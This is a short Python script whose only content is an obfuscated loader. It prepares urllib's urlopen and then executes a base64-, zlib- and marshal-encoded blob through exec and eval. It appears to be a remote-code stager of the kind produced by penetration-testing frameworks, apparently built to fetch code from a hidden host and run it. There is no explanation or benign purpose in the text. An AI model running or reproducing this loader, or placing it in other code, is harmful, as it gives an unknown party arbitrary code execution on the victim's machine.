import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWVgYCgtyskvSM3TUM8oKSmw0tc3NLPUMzQ10DO0NNMzt7QyNDa20NfXLy5JTE8tKtZPN/TWK6hU19QrSk1M0dAEAFxUElI=')))))
